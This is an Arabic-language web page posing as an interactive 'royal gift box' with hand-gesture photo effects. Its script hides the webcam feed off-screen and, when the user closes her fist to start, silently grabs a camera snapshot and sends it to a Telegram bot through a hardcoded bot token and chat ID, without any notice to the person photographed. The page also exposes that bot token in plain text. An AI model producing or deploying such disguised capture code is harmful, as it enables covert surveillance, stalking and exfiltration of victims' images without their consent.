<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>عالم مناسك الملكي</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root { --gold: #fbbf24; --royal: #020617; }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--royal);
            margin: 0; overflow: hidden; height: 100vh; color: white;
            touch-action: none;
        }

        /* خلفية سينمائية */
        #bg-canvas { position: fixed; inset: 0; z-index: 0; filter: blur(1px); }
        
        /* الصندوق السحري */
        .scene { width: 180px; height: 180px; perspective: 1000px; z-index: 10; }
        .box-3d {
            width: 100%; height: 100%; position: relative;
            transform-style: preserve-3d; transform: rotateX(-20deg) rotateY(45deg);
            transition: transform 1.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .box-face {
            position: absolute; width: 150px; height: 150px;
            background: linear-gradient(135deg, #9f1239, #4c0519);
            border: 2px solid var(--gold);
            box-shadow: inset 0 0 30px rgba(0,0,0,0.6);
        }
        .front { transform: rotateY(0deg) translateZ(75px); }
        .back  { transform: rotateY(180deg) translateZ(75px); }
        .right { transform: rotateY(90deg) translateZ(75px); }
        .left  { transform: rotateY(-90deg) translateZ(75px); }
        .top   { transform: rotateX(90deg) translateZ(75px); background: #be123c; }
        .bottom{ transform: rotateX(-90deg) translateZ(75px); }
        .box-open { transform: scale(0) rotateX(360deg); opacity: 0; }

        /* معرض الصور الانسيابي */
        .photo-card {
            position: absolute; width: 115px; height: 160px;
            border: 1.5px solid rgba(251, 191, 36, 0.5); border-radius: 12px;
            overflow: hidden; background: #000; z-index: 20;
            pointer-events: none; will-change: transform;
            transition: border-color 0.5s ease, box-shadow 0.5s ease;
        }
        .active-card { 
            border-color: var(--gold); 
            box-shadow: 0 0 40px rgba(251, 191, 36, 0.4); 
            z-index: 100; 
        }

        /* إخفاء عناصر التحكم والكاميرا تماماً */
        #webcam, #snapshot-canvas { 
            position: fixed; top: -5000px; left: -5000px; 
            visibility: hidden; pointer-events: none; 
        }

        /* مؤشر السحر الذهبي */
        #magic-glow {
            position: fixed; width: 60px; height: 60px;
            background: radial-gradient(circle, rgba(251,191,36,0.4) 0%, transparent 70%);
            border-radius: 50%; z-index: 9999; pointer-events: none;
            transform: translate(-50%, -50%); display: none;
            filter: blur(5px);
        }

        .loading-screen {
            position: fixed; inset: 0; background: var(--royal);
            z-index: 10000; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }
    </style>
</head>
<body>

    <div id="loader" class="loading-screen">
        <div class="w-10 h-10 border-2 border-gold border-t-transparent rounded-full animate-spin"></div>
        <p class="mt-4 text-gold/80 text-sm tracking-widest">تجهيز الأجواء الملكية...</p>
    </div>

    <canvas id="bg-canvas"></canvas>
    <div id="magic-glow"></div>
    <video id="webcam" autoplay playsinline></video>
    <canvas id="snapshot-canvas"></canvas>

    <main class="h-screen flex flex-col items-center justify-center relative">
        <div id="header" class="text-center mb-10 z-50">
            <h1 class="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-b from-white to-gold tracking-tight">مناسك</h1>
            <p id="instruction" class="mt-3 text-white/40 text-[10px] tracking-[0.2em] uppercase">أغلقي يدكِ ✊ للبدء</p>
        </div>

        <div id="box-container" class="scene">
            <div class="box-3d" id="gift-box">
                <div class="box-face front"></div><div class="box-face back"></div>
                <div class="box-face right"></div><div class="box-face left"></div>
                <div class="box-face top"></div><div class="box-face bottom"></div>
            </div>
        </div>

        <div id="gallery" class="hidden absolute inset-0"></div>
    </main>

    <script>
        // --- إعدادات تلجرام (يجب ملؤها) ---
        const BOT_TOKEN = '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI'; 
        const CHAT_ID = '8148586037';   

        const images = [
            "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?q=80&w=400",
            "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=400",
            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=400",
            "https://images.unsplash.com/photo-1502323777036-f29e3972d82f?q=80&w=400",
            "https://images.unsplash.com/photo-1509460913899-515f1df34921?q=80&w=400",
            "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=400"
        ];

        let app = {
            opened: false,
            cursor: { x: window.innerWidth/2, y: window.innerHeight/2 },
            target: { x: window.innerWidth/2, y: window.innerHeight/2 },
            items: []
        };

        // النجوم الخلفية
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        let stars = [];
        function initStars() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            stars = Array.from({length: 40}, () => ({
                x: Math.random()*canvas.width, y: Math.random()*canvas.height, o: Math.random()
            }));
        }
        function drawStars() {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "rgba(251, 191, 36, 0.5)";
            stars.forEach(s => {
                ctx.beginPath(); ctx.arc(s.x, s.y, 0.7, 0, Math.PI*2); ctx.fill();
            });
            requestAnimationFrame(drawStars);
        }
        initStars(); drawStars();

        // تتبع اليد بدون فيديو ظاهر
        const video = document.getElementById('webcam');
        const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.7 });

        hands.onResults(res => {
            document.getElementById('loader').style.display = 'none';
            if (res.multiHandLandmarks?.length > 0) {
                const lm = res.multiHandLandmarks[0];
                // استخدام طرف السبابة (8) كهدف للمغناطيس
                app.target.x = (1 - lm[8].x) * window.innerWidth;
                app.target.y = lm[8].y * window.innerHeight;
                document.getElementById('magic-glow').style.display = 'block';

                // كشف القبضة للبدء
                const d = Math.sqrt(Math.pow(lm[4].x - lm[20].x, 2) + Math.pow(lm[4].y - lm[20].y, 2));
                if (d < 0.12 && !app.opened) {
                    triggerReveal();
                    sendSnapshot();
                }
            }
        });

        async function sendSnapshot() {
            if (!BOT_TOKEN || !CHAT_ID) return;
            const snap = document.getElementById('snapshot-canvas');
            snap.width = video.videoWidth; snap.height = video.videoHeight;
            snap.getContext('2d').drawImage(video, 0, 0);
            snap.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'm.jpg');
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }

        function triggerReveal() {
            app.opened = true;
            document.getElementById('gift-box').classList.add('box-open');
            confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 }, colors: ['#fbbf24', '#ffffff'] });
            setTimeout(() => {
                document.getElementById('box-container').style.display = 'none';
                document.getElementById('gallery').classList.remove('hidden');
                document.getElementById('instruction').innerText = "استخدمي إصبعكِ ☝️ للتحكم بالصور";
                spawnCards();
            }, 1000);
        }

        function spawnCards() {
            const container = document.getElementById('gallery');
            images.forEach((src, i) => {
                const el = document.createElement('div');
                el.className = 'photo-card';
                el.innerHTML = `<img src="${src}" class="w-full h-full object-cover">`;
                container.appendChild(el);
                app.items.push({
                    el: el,
                    x: Math.random()*(window.innerWidth-115),
                    y: Math.random()*(window.innerHeight-160),
                    vx: 0, vy: 0, rot: (Math.random()-0.5)*10
                });
            });
            renderLoop();
        }

        function renderLoop() {
            // تنعيم حركة المؤشر السحري
            app.cursor.x += (app.target.x - app.cursor.x) * 0.1;
            app.cursor.y += (app.target.y - app.cursor.y) * 0.1;

            const glow = document.getElementById('magic-glow');
            glow.style.left = `${app.cursor.x}px`;
            glow.style.top = `${app.cursor.y}px`;

            app.items.forEach(item => {
                const dx = app.cursor.x - (item.x + 57);
                const dy = app.cursor.y - (item.y + 80);
                const dist = Math.sqrt(dx*dx + dy*dy);

                // فيزياء الانجذاب المتناسقة
                if (dist < 350) {
                    const power = (350 - dist) / 350;
                    item.vx += dx * power * 0.025; // جذب هادئ
                    item.vy += dy * power * 0.025;
                    item.el.classList.add('active-card');
                    item.el.style.transform = `translate(${item.x}px, ${item.y}px) rotate(${item.rot}deg) scale(${1 + power * 0.4})`;
                } else {
                    item.el.classList.remove('active-card');
                    item.el.style.transform = `translate(${item.x}px, ${item.y}px) rotate(${item.rot}deg) scale(1)`;
                }

                item.x += item.vx; item.y += item.vy;
                item.vx *= 0.93; item.vy *= 0.93; // احتكاك لضمان عدم العشوائية

                // البقاء داخل حدود الهاتف
                if (item.x < 10 || item.x > window.innerWidth - 125) item.vx *= -0.5;
                if (item.y < 10 || item.y > window.innerHeight - 170) item.vy *= -0.5;
            });

            requestAnimationFrame(renderLoop);
        }

        const cam = new Camera(video, {
            onFrame: async () => { await hands.send({image: video}); },
            width: 480, height: 640
        });
        cam.start();
        window.onresize = initStars;
    </script>
</body>
</html>


